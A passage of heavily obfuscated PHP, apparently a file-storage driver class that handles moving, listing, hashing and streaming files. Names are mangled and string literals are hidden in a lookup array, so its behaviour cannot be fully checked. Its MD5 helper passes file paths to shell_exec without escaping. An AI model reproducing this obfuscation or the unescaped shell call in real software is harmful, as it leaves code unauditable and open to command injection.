$BŠÙİ‚“ñ = $this->getPathOuter($BŠÙİ‚“ñ); $câ•››äÎø = $this->pathFather($BŠÙİ‚“ñ) . $câ•››äÎø; if (IO::isFile($BŠÙİ‚“ñ)) { $E™™îÛ½¸¥ = IO::copy($BŠÙİ‚“ñ, $this->pathFather($BŠÙİ‚“ñ), REPEAT_RENAME_FOLDER, $déáñÈÂø’); if ($E™™îÛ½¸¥) { IO::remove($BŠÙİ‚“ñ); } } else { $E™™îÛ½¸¥ = IO::mkdir($câ•››äÎø); if (!$E™™îÛ½¸¥) { return !1; } $F¢¼¼İò‹Ñ = IO::listPath($BŠÙİ‚“ñ, !0); $f“ÖË÷§Ú£ = array_merge($F¢¼¼İò‹Ñ[$F‚¹É¨Ë½Ê[74]], $F¢¼¼İò‹Ñ[$F‚¹É¨Ë½Ê[75]]); foreach ($f“ÖË÷§Ú£ as $dğ‹Ü’Œ’‡) { IO::move($dğ‹Ü’Œ’‡[$F‚¹É¨Ë½Ê[76]], $câ•››äÎø, REPEAT_RENAME_FOLDER); } IO::remove($BŠÙİ‚“ñ); } goto B¨˜ğùÜ; B¨˜ğùÜ: return $E™™îÛ½¸¥ ? $câ•››äÎø : !1; goto eÕÑî‰å©; eÕÑî‰å©: } public function tempFile($eßƒöêÓƒñ = '', $FÖÇĞ½„À¨ = '') { goto C©©Û¸¾áö; FÍ®ŸÀ’ø: $AÛ‘ºè¤¾— = $FòÕ¥¤™º– . $eßƒöêÓƒñ; @touch($AÛ‘ºè¤¾—); if ($FÖÇĞ½„À¨) { file_put_contents($AÛ‘ºè¤¾—, $FÖÇĞ½„À¨); } goto AÓòƒ²œÓ§; C©©Û¸¾áö: if (!$eßƒöêÓƒñ) { $eßƒöêÓƒñ = rand_string(15); } $FòÕ¥¤™º– = TEMP_FILES . rand_string(15) . $_SERVER[¬ı§†‰ú˜¼][8]; @mkdir($FòÕ¥¤™º–, 511, !0); goto FÍ®ŸÀ’ø; AÓòƒ²œÓ§: return $AÛ‘ºè¤¾—; goto B÷õÎ¢ë¡; B÷õÎ¢ë¡: } public function tempFileRemve($C‚â‹ÃéìŞ) { @unlink($C‚â‹ÃéìŞ); @rmdir($this->pathFather($C‚â‹ÃéìŞ)); } public function mkfile($c¿âÃÉÒ™, $a’ì˜æ¾íï = '', $bÎˆ¬à±…„ = REPEAT_RENAME) { } public function mkdir($AÂÚ“†ºŠ, $B£ö«£¶¼ = REPEAT_SKIP) { } public function delFile($A¥Š£ÖóÍ×) { } public function delFolder($DÎœ÷äñ¬§) { } public function copyFile($d±¥‹İ‘Æ, $BµÎò»¼ğŞ) { } public function moveFile($e¥‰ªìãœ£, $c­¯œ·©¶É) { } public function remove($C¦¾ ô‹«Ø) { if ($this->isFile($C¦¾ ô‹«Ø)) { return $this->delFile($C¦¾ ô‹«Ø); } return $this->delFolder($C¦¾ ô‹«Ø); } public function rename($d¦Ö†ßµ«Æ, $a½ƒ“Ç£÷É) { } public function exist($b—…µĞÑï©) { } public function findByHash($bä÷µÊ†ô = '', $eÑÚÚ‡ë·² = '') { return !1; } public function isFile($E—ó»•½ò­) { } public function isFolder($fà”—·Ñá´) { } public function size($EÚßÜƒ½¾è) { } public function info($EÍŠºç‹¿¦) { } public function infoSimple($e©÷—½äß) { return $this->info($e©÷—½äß); } public function infoAuth($a¯ˆ¦‡¯ï‚) { return $this->info($a¯ˆ¦‡¯ï‚); } public function infoFull($b‚ß—â«ªÌ) { return $this->info($b‚ß—â«ªÌ); } public function infoWithChildren($aÛœ­ë´Ö) { $A¹Í¬ğä¹ =& $_SERVER[¬ı§†‰ú˜¼]; static $D„ Êº²˜ = array(); if (isset($D„ Êº²˜[$aÛœ­ë´Ö])) { return $D„ Êº²˜[$aÛœ­ë´Ö]; } $cÔíµ é« = $this->info($aÛœ­ë´Ö); if ($cÔíµ é« && $cÔíµ é«[$A¹Í¬ğä¹[29]] == $A¹Í¬ğä¹[77]) { $b‚…îº³¶­ = array($A¹Í¬ğä¹[78] => 0, $A¹Í¬ğä¹[79] => 0, $A¹Í¬ğä¹[80] => 0); $this->infoChildren($aÛœ­ë´Ö, $b‚…îº³¶­); $cÔíµ é«[$A¹Í¬ğä¹[78]] = $b‚…îº³¶­[$A¹Í¬ğä¹[78]]; $cÔíµ é«[$A¹Í¬ğä¹[81]] = array($A¹Í¬ğä¹[82] => $b‚…îº³¶­[$A¹Í¬ğä¹[79]], $A¹Í¬ğä¹[83] => $b‚…îº³¶­[$A¹Í¬ğä¹[80]]); $D„ Êº²˜[$aÛœ­ë´Ö] = $cÔíµ é«; } return $cÔíµ é«; } public function listPath($F–šê­é–, $C²Å”¥ñÊÈ = false) { } public function has($aØ‰èíéœã, $DÑÊ†ÏÅç = false, $cé¢Œ¯ÖàÍ = false) { } public function canRead($BÏŠÃ®ìİï) { } public function canWrite($D³ˆ°ğ†Ï) { } public function getContent($aÈÌã­‰ÑÏ) { } public function setContent($cÒŸ¿íòÀö, $C‚¾Ö©ÌÂ· = '') { } protected function infoChildren($F˜»çªµƒ, &$Fƒ…•‹£˜Í) { $bÄ±Ë‘¯‹ =& $_SERVER[¬ı§†‰ú˜¼]; check_abort_echo(); $FÁÜ‚µø˜ = $this->listPath($F˜»çªµƒ, !0); $FÁÜ‚µø˜ = array_merge($FÁÜ‚µø˜[$bÄ±Ë‘¯‹[75]], $FÁÜ‚µø˜[$bÄ±Ë‘¯‹[74]]); foreach ($FÁÜ‚µø˜ as $Bâ¨Ù‰Ëè…) { if ($Bâ¨Ù‰Ëè…[$bÄ±Ë‘¯‹[29]] == $bÄ±Ë‘¯‹[77]) { $Fƒ…•‹£˜Í[$bÄ±Ë‘¯‹[80]]++; $eåŒÀØ Ğ = $this->getPathInner($Bâ¨Ù‰Ëè…[$bÄ±Ë‘¯‹[76]]); $this->infoChildren($eåŒÀØ Ğ, $Fƒ…•‹£˜Í); } else { $Fƒ…•‹£˜Í[$bÄ±Ë‘¯‹[79]]++; $Fƒ…•‹£˜Í[$bÄ±Ë‘¯‹[78]] += $Bâ¨Ù‰Ëè…[$bÄ±Ë‘¯‹[78]]; } } } public function fileSubstr($dóˆ‹¿â£³, $b¡õÜ¸õ, $B©”½Çõ¤Û) { } public function listAll($aïİî§˜à…) { } public function listAllMake($E±¸¬Ñ‚¤£, &$b¤ÚÙÖæéí) { $Aò•£šŒÀ© =& $_SERVER[¬ı§†‰ú˜¼]; check_abort_echo(); $F…öéÌ—Ïä = $this->listPath($E±¸¬Ñ‚¤£, !0); if (!$F…öéÌ—Ïä) { return; } $eÉè¸˜öÙÁ = array_merge($F…öéÌ—Ïä[$Aò•£šŒÀ©[75]], $F…öéÌ—Ïä[$Aò•£šŒÀ©[74]]); foreach ($eÉè¸˜öÙÁ as $D¢™Í‘Ÿ™) { goto d‚ ëá¸¡ø; d‚ ëá¸¡ø: $Dô‚Ï¼çœá = $D¢™Í‘Ÿ™[$Aò•£šŒÀ©[29]] == $Aò•£šŒÀ©[77]; $F©¿µ‰‰Ù = array($Aò•£šŒÀ©[76] => $D¢™Í‘Ÿ™[$Aò•£šŒÀ©[76]], $Aò•£šŒÀ©[77] => $Dô‚Ï¼çœá); if (isset($D¢™Í‘Ÿ™[$Aò•£šŒÀ©[78]])) { $F©¿µ‰‰Ù[$Aò•£šŒÀ©[78]] = $D¢™Í‘Ÿ™[$Aò•£šŒÀ©[78]]; } goto e¡ÊÅÂ¯›; e“‡Ñ¦¨ÄÅ: $this->listAllMake($D¢™Í‘Ÿ™[$Aò•£šŒÀ©[76]], $b¤ÚÙÖæéí); goto CÖ¿”‰›»; e¡ÊÅÂ¯›: if (isset($D¢™Í‘Ÿ™[$Aò•£šŒÀ©[84]])) { $F©¿µ‰‰Ù[$Aò•£šŒÀ©[84]] = $D¢™Í‘Ÿ™[$Aò•£šŒÀ©[84]]; } if (!$Dô‚Ï¼çœá) { $b¤ÚÙÖæéí[] = $F©¿µ‰‰Ù; continue; } $b¤ÚÙÖæéí[] = $F©¿µ‰‰Ù; goto e“‡Ñ¦¨ÄÅ; CÖ¿”‰›»: } } public function listAllSimple($bâ’‘Œ¶Óš) { $fÒ—Êºˆ¦¢ =& $_SERVER[¬ı§†‰ú˜¼]; $F³†²ØÄ¡ã = array(); $CùŞã¬ñÆ› = $this->listAll($bâ’‘Œ¶Óš); $dšğ·ìñİö = $this->getPathOuter($bâ’‘Œ¶Óš); foreach ($CùŞã¬ñÆ› as $dÚ›‘ÌŠÁù) { goto E ³ƒ×é¥; Fˆ”£ôİ: $Cê÷Âãõö¢ = array($fÒ—Êºˆ¦¢[76] => $Bï§ä§‰», $fÒ—Êºˆ¦¢[77] => $dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[77]]); if (isset($dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[78]]) && !$dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[77]]) { $Cê÷Âãõö¢[$fÒ—Êºˆ¦¢[78]] = $dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[78]]; } if (isset($dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[84]])) { $Cê÷Âãõö¢[$fÒ—Êºˆ¦¢[84]] = $dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[84]]; } goto AŒ¹Á”å; AŒ¹Á”å: if (!$dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[77]]) { $Cê÷Âãõö¢[$fÒ—Êºˆ¦¢[86]] = $A˜ŒÓáİÌœ; } $F³†²ØÄ¡ã[] = $Cê÷Âãõö¢; goto D‚ŠÎÑ¡°³; E ³ƒ×é¥: $A˜ŒÓáİÌœ = $dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[76]]; $Bï§ä§‰» = $dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[76]]; if (isset($dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[85]])) { $A˜ŒÓáİÌœ = $dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[85]][$fÒ—Êºˆ¦¢[76]]; $dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[78]] = $dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[85]][$fÒ—Êºˆ¦¢[78]]; $dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[84]] = $dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[85]][$fÒ—Êºˆ¦¢[84]]; } else { $Bï§ä§‰» = substr($dÚ›‘ÌŠÁù[$fÒ—Êºˆ¦¢[76]], strlen(get_path_father($dšğ·ìñİö))); $Bï§ä§‰» = $fÒ—Êºˆ¦¢[8] . ltrim($Bï§ä§‰», $fÒ—Êºˆ¦¢[8]); } goto Fˆ”£ôİ; D‚ŠÎÑ¡°³: } return $F³†²ØÄ¡ã; } public function upload($Eğ’µ³ì­, $AÏÄ‚©öïƒ, $AßØŞÂã¯‹ = false, $Dˆ¥¹¡ÙŠß = REPEAT_REPLACE) { } public function uploadFileByID($dç‚æÓê¯Ò, $e†Ú†À»¢Ç, $f†É÷‚©ª•) { } public function uploadFileByPath($bÔ…î²“á, $AÈ ªç‘ğ¯, $B°¡¢Ö«¥’ = array()) { } public function isUploadServer() { $DˆÂÏæº¿ =& $_SERVER[¬ı§†‰ú˜¼]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $DˆÂÏæº¿[87]) { return !0; } return $GLOBALS[$DˆÂÏæº¿[6]][$DˆÂÏæº¿[88]][$DˆÂÏæº¿[89]]; } public function isFileOutServer() { $Eè´¸‡ˆ–¯ =& $_SERVER[¬ı§†‰ú˜¼]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Eè´¸‡ˆ–¯[87]) { return !0; } return $GLOBALS[$Eè´¸‡ˆ–¯[6]][$Eè´¸‡ˆ–¯[88]][$Eè´¸‡ˆ–¯[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($BØÌÂĞ„ï) { $cëÔš³Ïò =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->isCdnHost()) { return $BØÌÂĞ„ï; } return str_replace(trim(get_url_root($BØÌÂĞ„ï), $cëÔš³Ïò[8]), trim($this->cdnHost, $cëÔš³Ïò[8]), $BØÌÂĞ„ï); } public function uploadLink($b¨çË»”º, $cï©™•Ÿ–Ç = 0) { goto eƒÎÊ¼ôÊ; dä˜ª¾ù²ª: $fà¨Ä§÷µ = $cï©™•Ÿ–Ç <= $aÈƒÑ¤ÂĞ™ ? $eöÉŞÄ«Â–[91] : $eöÉŞÄ«Â–[92]; $C—ó×ÔŒâ = (!$cï©™•Ÿ–Ç ? 1 : ceil($cï©™•Ÿ–Ç / pow(1024, 3))) * 3600 * 4; $Dãùø£— = $this->{$fà¨Ä§÷µ}($b¨çË»”º, $C—ó×ÔŒâ); goto c’ŒÜîëÊ„; c’ŒÜîëÊ„: if ($Dãùø£—) { $Dãùø£—[$eöÉŞÄ«Â–[93]] = $b¨çË»”º; $Dãùø£—[$eöÉŞÄ«Â–[94]] = $DÁŠÌ…‰; } return $Dãùø£—; goto CİŠ‘ÃÂãÆ; cªåÙßùáï: if (!in_array($DÁŠÌ…‰, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $aÈƒÑ¤ÂĞ™ = 1024 * 1024 * 10; goto dä˜ª¾ù²ª; eƒÎÊ¼ôÊ: $eöÉŞÄ«Â– =& $_SERVER[¬ı§†‰ú˜¼]; if ($this->isUploadServer()) { return; } $DÁŠÌ…‰ = $this->getType(); goto cªåÙßùáï; CİŠ‘ÃÂãÆ: } public function uploadFormData($eÒ¢¢„”¨½, $D†ÑººÜë  = 3600) { } public function multiUploadFormData($D•°ò£¦ø±, $B‘¶ä×ÆÀÕ = 3600) { } public function download($Fáö‚…–…İ, $c‚ó…òáÂ) { } public function ext($cŒšÉöØ­) { $DÑë‡„Ùé‹ =& $_SERVER[¬ı§†‰ú˜¼]; if (strpos($cŒšÉöØ­, $DÑë‡„Ùé‹[8]) === -1) { $E¥·Æá¨· = $cŒšÉöØ­; } else { $E¥·Æá¨· = $this->pathThis($cŒšÉöØ­); } $e’îâ¹Ô = $DÑë‡„Ùé‹[33]; if (strstr($E¥·Æá¨·, $DÑë‡„Ùé‹[95])) { $e’îâ¹Ô = substr($E¥·Æá¨·, strrpos($E¥·Æá¨·, $DÑë‡„Ùé‹[95]) + 1); $e’îâ¹Ô = strtolower($e’îâ¹Ô); } if (strlen($e’îâ¹Ô) > 3 && preg_match($DÑë‡„Ùé‹[96], $e’îâ¹Ô, $B½äçî“ª‰)) { $e’îâ¹Ô = $DÑë‡„Ùé‹[33]; } return $e’îâ¹Ô; } public function pathThis($A¹ÈíŒõé) { $bòª³¿èõ÷ =& $_SERVER[¬ı§†‰ú˜¼]; $A¹ÈíŒõé = str_replace($bòª³¿èõ÷[97], $bòª³¿èõ÷[8], rtrim($A¹ÈíŒõé, $bòª³¿èõ÷[8])); $B¢“ô¬öç = strrpos($A¹ÈíŒõé, $bòª³¿èõ÷[8]); if ($B¢“ô¬öç === !1) { return $A¹ÈíŒõé; } return substr($A¹ÈíŒõé, $B¢“ô¬öç + 1); } public function pathFather($F¿Ê¼…˜ùæ) { $Dö„Áí²éŠ =& $_SERVER[¬ı§†‰ú˜¼]; $F¿Ê¼…˜ùæ = str_replace($Dö„Áí²éŠ[97], $Dö„Áí²éŠ[8], rtrim($F¿Ê¼…˜ùæ, $Dö„Áí²éŠ[8])); $dòŞîíƒô = strrpos($F¿Ê¼…˜ùæ, $Dö„Áí²éŠ[8]); if ($dòŞîíƒô === !1) { return $Dö„Áí²éŠ[33]; } return substr($F¿Ê¼…˜ùæ, 0, $dòŞîíƒô + 1); } public function hashSimple($C—ÛµáŠ) { goto f‹áÅ¥²Éò; eô‘ÏĞöÜ³: $d‡Â¥½Ô‹ = intval($FáñøÁ™¢Ş / $a…íœáÇÜ); $B¶ŒÂæÀ = $f‰–ÛĞÖĞ™[33]; for ($B™¸Ç°Õ²è = 0; $B™¸Ç°Õ²è < $a…íœáÇÜ; $B™¸Ç°Õ²è++) { $B¶ŒÂæÀ .= $this->fileSubstr($C—ÛµáŠ, $d‡Â¥½Ô‹ * $B™¸Ç°Õ²è, $Fë×Ü °ê); } goto d³ŒÚ“¹‰; d³ŒÚ“¹‰: $B¶ŒÂæÀ .= $this->fileSubstr($C—ÛµáŠ, $FáñøÁ™¢Ş - $Fë×Ü °ê, $Fë×Ü °ê); return md5($B¶ŒÂæÀ) . $FáñøÁ™¢Ş; goto a‡•«…Ï²Ä; f‹áÅ¥²Éò: $f‰–ÛĞÖĞ™ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$C—ÛµáŠ) { return md5($f‰–ÛĞÖĞ™[33]); } $FáñøÁ™¢Ş = $this->size($C—ÛµáŠ); goto d¶‡«î‰Ï; d¶‡«î‰Ï: $Fë×Ü °ê = 200; $a…íœáÇÜ = 50; if ($FáñøÁ™¢Ş <= $Fë×Ü °ê * $a…íœáÇÜ) { return $this->hashMd5($C—ÛµáŠ) . $FáñøÁ™¢Ş; } goto eô‘ÏĞöÜ³; a‡•«…Ï²Ä: } public static $md5Cache = array(); public function hashMd5($Bˆ³£©óóÆ) { $Bˆ³£©óóÆ = $this->iconvSystem($Bˆ³£©óóÆ); if (isset(self::$md5Cache[$Bˆ³£©óóÆ])) { return self::$md5Cache[$Bˆ³£©óóÆ]; } self::$md5Cache[$Bˆ³£©óóÆ] = $this->hashMd5Shell($Bˆ³£©óóÆ); if (!self::$md5Cache[$Bˆ³£©óóÆ]) { self::$md5Cache[$Bˆ³£©óóÆ] = @md5_file($Bˆ³£©óóÆ); } return self::$md5Cache[$Bˆ³£©óóÆ]; } private function hashMd5Shell($bÛœëëà‚¹) { goto a¨í¸›”‹; a³°…ì¬Â: $a™åŒ‘ƒ”Ø = Cache::get($A¹Ó‰Ë¾[101]); if (!$a™åŒ‘ƒ”Ø) { $e­—ø Ì´¶ = BASIC_PATH . $A¹Ó‰Ë¾[102]; $Bøª÷—“ëì = md5_file($e­—ø Ì´¶); $a™åŒ‘ƒ”Ø = $A¹Ó‰Ë¾[103]; foreach ($d¿ƒêİŠøµ as $A°—µºˆµ‡) { $bÌÂŞ°§£Ô = shell_exec($A°—µºˆµ‡ . "\40\42{$e­—ø Ì´¶}\x22"); if ($bÌÂŞ°§£Ô && substr(trim($bÌÂŞ°§£Ô), 0, 32) == $Bøª÷—“ëì) { $a™åŒ‘ƒ”Ø = $A°—µºˆµ‡; break; } } Cache::set($A¹Ó‰Ë¾[101], $a™åŒ‘ƒ”Ø, 3600); } if ($a™åŒ‘ƒ”Ø == $A¹Ó‰Ë¾[103]) { return !1; } goto f‚Ä®¢Şò›; f‚Ä®¢Şò›: $bÌÂŞ°§£Ô = shell_exec($a™åŒ‘ƒ”Ø . "\x20\42{$bÛœëëà‚¹}\x22"); $bÌÂŞ°§£Ô = str_replace($A¹Ó‰Ë¾[104], $A¹Ó‰Ë¾[33], $bÌÂŞ°§£Ô); return substr($bÌÂŞ°§£Ô, 0, 32); goto D³™İ­õ­; a¨í¸›”‹: $A¹Ó‰Ë¾ =& $_SERVER[¬ı§†‰ú˜¼]; if (!function_exists($A¹Ó‰Ë¾[98])) { return !1; } $d¿ƒêİŠøµ = array($A¹Ó‰Ë¾[99], $A¹Ó‰Ë¾[100]); goto a³°…ì¬Â; D³™İ­õ­: } public function link($C°ô¹…Ô¶¦) { return $C°ô¹…Ô¶¦; } public function fileOut($aÌœ°ª²ª‰, $CÁ‚×Šòƒ÷ = false, $Fõ”Ù‡éİ = false, $aÜÇ»ô†‘¶ = '') { goto BãÒ¤›Ì§ğ; d‚™ÑÁè¥İ: $B¾íŞ…«’Û = 0; $BçÂõ‹‘ = $Eé¿©ÁŠ‰Ä - 1; $e¢Â¸Å¦ê§ = $this->ext($aãÅÔƒé¡²); goto AºĞ†õ“âÏ; e²êøØÊ…á: if (isset($_SERVER[$añë©É›µä[131]]) && strtotime($_SERVER[$añë©É›µä[131]]) == $C‚„Õç’¨¼[$añë©É›µä[84]]) { header($añë©É›µä[132], !0, 304); die; } if (isset($_SERVER[$añë©É›µä[133]]) && $_SERVER[$añë©É›µä[133]] == $aÜÇ»ô†‘¶) { header($añë©É›µä[134] . $aÜÇ»ô†‘¶, !0, 304); die; } header($añë©É›µä[134] . $aÜÇ»ô†‘¶); goto a‘é°Â”»‡; dšÌŸÏä‹È: $dÂà×±®µ = strtolower($_SERVER[$añë©É›µä[142]]); if ($C‰ÄÅ†Äñ && $dÂà×±®µ && $aÎ‹ª£Ô) { if (strstr($dÂà×±®µ, $añë©É›µä[143])) { header($añë©É›µä[144] . $aÌœ°ª²ª‰); } else { if (strstr($dÂà×±®µ, $añë©É›µä[145])) { header($añë©É›µä[146] . $aÌœ°ª²ª‰); } else { if (strstr($dÂà×±®µ, $añë©É›µä[147])) { header($añë©É›µä[148] . $aÌœ°ª²ª‰); } } } if ($E—©âáùù¡) { header($añë©É›µä[149] . $E—©âáùù¡); } return; } if (isset($_SERVER[$añë©É›µä[150]])) { if (preg_match($añë©É›µä[151], $_SERVER[$añë©É›µä[150]], $EõÍ„ö©Óí)) { $B¾íŞ…«’Û = intval($EõÍ„ö©Óí[1]); if (!empty($EõÍ„ö©Óí[2])) { $BçÂõ‹‘ = intval($EõÍ„ö©Óí[2]); } } header($añë©É›µä[152]); header("\103\157\156\x74\145\x6e\x74\x2d\122\141\x6e\147\145\x3a\x20\142\x79\x74\145\163\x20{$B¾íŞ…«’Û}\55{$BçÂõ‹‘}\x2f" . $Eé¿©ÁŠ‰Ä); } else { header($añë©É›µä[153]); } goto f¤Í„©É½×; bæ©ïøâ½Æ: header($añë©É›µä[138] . $Eé¿©ÁŠ‰Ä); header($añë©É›µä[139]); if (!$CÁ‚×Šòƒ÷ && $e¢Â¸Å¦ê§ == $añë©É›µä[140]) { if ($Eé¿©ÁŠ‰Ä > 1024 * 1024 * 5) { die; } $dù˜øÈˆè = $this->getContent($aÌœ°ª²ª‰); $dù˜øÈˆè = Html::clearSVG($dù˜øÈˆè); header($añë©É›µä[141] . strlen($dù˜øÈˆè)); echo $dù˜øÈˆè; die; } goto dšÌŸÏä‹È; B°öƒê„ å: header($añë©É›µä[120]); header($añë©É›µä[121] . $dÌÑ†´Íâô); $Bù«¦ØïÈÀ = rawurlencode($aãÅÔƒé¡²); goto c”Î¾¾šø¬; b¹¶ºèñÇŒ: header($añë©É›µä[128]); header($añë©É›µä[129]); header($añë©É›µä[130]); goto e²êøØÊ…á; f´³‘ÙÅ“×: @ob_end_clean(); set_timeout(); $C‚„Õç’¨¼ = $this->infoFull($aÌœ°ª²ª‰); goto EÛÃºÎ¹‚; f¤Í„©É½×: $eÊµÒåĞ´æ = !0; if ($_SERVER[$añë©É›µä[154]] == $añë©É›µä[155] && $Eé¿©ÁŠ‰Ä > 1204 * 1024 * 1024 * 2) { $eÊµÒåĞ´æ = !1; } if ($eÊµÒåĞ´æ) { header($añë©É›µä[156] . ($BçÂõ‹‘ - $B¾íŞ…«’Û + 1)); } goto DãâùäŠ¬ƒ; BãÒ¤›Ì§ğ: $añë©É›µä =& $_SERVER[¬ı§†‰ú˜¼]; $this->cacheMethod(null, null); if (!$aÌœ°ª²ª‰ || !$this->exist($aÌœ°ª²ª‰)) { show_json(LNG($añë©É›µä[105]), !1, $Fõ”Ù‡éİ); } goto Eñ½ Ç‹ğ¢; a‘é°Â”»‡: header($añë©É›µä[135] . $cÛ¶ÔÚùëó . $añë©É›µä[127]); header($añë©É›µä[136] . $aãÅÔƒé¡²); header($añë©É›µä[137]); goto bæ©ïøâ½Æ; AºĞ†õ“âÏ: if (in_array($e¢Â¸Å¦ê§, array($añë©É›µä[111], $añë©É›µä[112], $añë©É›µä[113], $añë©É›µä[114]))) { $e¢Â¸Å¦ê§ = $añë©É›µä[115]; } if (!$aÜÇ»ô†‘¶) { $aÜÇ»ô†‘¶ = md5($cÛ¶ÔÚùëó . $this->hashSimple($aÌœ°ª²ª‰)); } $aÜÇ»ô†‘¶ = $añë©É›µä[116] . $aÜÇ»ô†‘¶ . $añë©É›µä[116]; goto Báìšª”ƒğ; EÛÃºÎ¹‚: $Eé¿©ÁŠ‰Ä = $C‚„Õç’¨¼[$añë©É›µä[78]]; $cÛ¶ÔÚùëó = gmdate($añë©É›µä[110], $C‚„Õç’¨¼[$añë©É›µä[84]]); $aãÅÔƒé¡² = $Fõ”Ù‡éİ ? $Fõ”Ù‡éİ : $this->iconvApp($C‚„Õç’¨¼[$añë©É›µä[28]]); goto d‚™ÑÁè¥İ; Báìšª”ƒğ: $dÌÑ†´Íâô = get_file_mime($e¢Â¸Å¦ê§); if (strstr($dÌÑ†´Íâô, $añë©É›µä[117])) { $dÌÑ†´Íâô = $dÌÑ†´Íâô . $añë©É›µä[118]; } if ($CÁ‚×Šòƒ÷ === !1 && !mime_support($dÌÑ†´Íâô)) { $CÁ‚×Šòƒ÷ = !0; $dÌÑ†´Íâô = $añë©É›µä[119]; } goto B°öƒê„ å; c”Î¾¾šø¬: $Bù«¦ØïÈÀ = $añë©É›µä[116] . $Bù«¦ØïÈÀ . $añë©É›µä[122] . $Bù«¦ØïÈÀ; if ($CÁ‚×Šòƒ÷) { header($añë©É›µä[123]); header($añë©É›µä[124] . $Bù«¦ØïÈÀ); } else { header($añë©É›µä[125] . $Bù«¦ØïÈÀ); } header($añë©É›µä[126] . gmdate($añë©É›µä[110], time() + 3600 * 24 * 30) . $añë©É›µä[127]); goto b¹¶ºèñÇŒ; f”ˆğ²ˆó: if ($E—©âáùù¡) { $A’¾¹¸¾© = intval(1000 * 1000 * ($BëîÌ·‘øä / $E—©âáùù¡)); } while ($B¾íŞ…«’Û <= $BçÂõ‹‘) { $Fí¼Ö¤“ãŠ = timeFloat(); check_abort(); $dä†¦Ì¸” = $BçÂõ‹‘ - $B¾íŞ…«’Û + 1; if ($dä†¦Ì¸” <= $BëîÌ·‘øä) { $BëîÌ·‘øä = $dä†¦Ì¸”; } echo $this->fileSubstr($aÌœ°ª²ª‰, $B¾íŞ…«’Û, $BëîÌ·‘øä); $B¾íŞ…«’Û += $BëîÌ·‘øä; if ($BëîÌ·‘øä == $dä†¦Ì¸”) { $B¾íŞ…«’Û = $BçÂõ‹‘ + 1; } if ($A’¾¹¸¾©) { $f¿ëœÚÓ  = intval(1000 * 1000 * (timeFloat() - $Fí¼Ö¤“ãŠ)); $CƒˆèãêŒå = $A’¾¹¸¾© - $f¿ëœÚÓ ; if ($CƒˆèãêŒå > 5) { usleep($CƒˆèãêŒå); } } } goto b¨¼ÖºÈ­Â; Eñ½ Ç‹ğ¢: $C‰ÄÅ†Äñ = $this->getType() == $añë©É›µä[106]; $aÎ‹ª£Ô = $GLOBALS[$añë©É›µä[6]][$añë©É›µä[88]][$añë©É›µä[107]][$añë©É›µä[108]]; $E—©âáùù¡ = (double) $GLOBALS[$añë©É›µä[6]][$añë©É›µä[88]][$añë©É›µä[107]][$añë©É›µä[109]] * 1024 * 1024; goto f´³‘ÙÅ“×; DãâùäŠ¬ƒ: if ($_SERVER[$añë©É›µä[157]] == $añë©É›µä[158]) { return; } $BëîÌ·‘øä = 1024 * 100; $A’¾¹¸¾© = 0; goto f”ˆğ²ˆó; b¨¼ÖºÈ­Â: } public function fileOutServer($CÂªìµ, $FÈ¸Éº™ìˆ = false, $F ªƒ¸ ƒ¤ = false, $A­¡øãÂ…× = '') { $this->fileOut($CÂªìµ, $FÈ¸Éº™ìˆ, $F ªƒ¸ ƒ¤, $A­¡øãÂ…×); } public function fileOutLink($aòÃ‰ğñïÉ) { header($_SERVER[¬ı§†‰ú˜¼][159] . $aòÃ‰ğñïÉ); die; } public function cacheMethod($F‰Šçí‰ÕØ, $A»›­ÎÌ¼Œ, $fæ©‹‘®« = null) { goto E±ì®°‚Ü’; d•‰ïó§¨Ó: if (!is_null($fæ©‹‘®«)) { $b’«£¹™›‚[$c°´Ï™è] = $fæ©‹‘®«; return; } $dšÉ‚¼ŸóÍ = isset($b’«£¹™›‚[$c°´Ï™è]) ? $b’«£¹™›‚[$c°´Ï™è] : null; if (!is_null($dšÉ‚¼ŸóÍ)) { return $dšÉ‚¼ŸóÍ; } goto cÄ“¼¹•¡°; cÄ“¼¹•¡°: $dšÉ‚¼ŸóÍ = $this->{$F‰Šçí‰ÕØ}($A»›­ÎÌ¼Œ); $b’«£¹™›‚[$c°´Ï™è] = $dšÉ‚¼ŸóÍ; return $dšÉ‚¼ŸóÍ; goto A»„°ª­øš; fÖö×Úñ: $c°´Ï™è = $Eà•¡‚ŸĞñ[160] . $F‰Šçí‰ÕØ . $Eà•¡‚ŸĞñ[161] . rtrim($C‡éŒÙ°£, $Eà•¡‚ŸĞñ[8]); if (is_null($F‰Šçí‰ÕØ)) { $b’«£¹™›‚ = array(); return; } if (is_null($A»›­ÎÌ¼Œ)) { unset($b’«£¹™›‚[$c°´Ï™è]); return; } goto d•‰ïó§¨Ó; E±ì®°‚Ü’: $Eà•¡‚ŸĞñ =& $_SERVER[¬ı§†‰ú˜¼]; static $b’«£¹™›‚ = array(); $C‡éŒÙ°£ = $A»›­ÎÌ¼Œ ? ltrim($this->getPathOuter($A»›­ÎÌ¼Œ), $Eà•¡‚ŸĞñ[8]) : $A»›­ÎÌ¼Œ; goto fÖö×Úñ; A»„°ª­øš: } public function fileOutImage($dÜ¶¨¯ª•ò, $a¹­÷¢º‰¡ = 250) { goto A¸óôÚèŠŒ; F¡ìŞÎó: $fä’‹¡Š™ = "{$E²Ê¾—¶íº}\137{$a¹­÷¢º‰¡}\x2e\x70\x6e\147"; if (!($A¯±âï“çÊ = 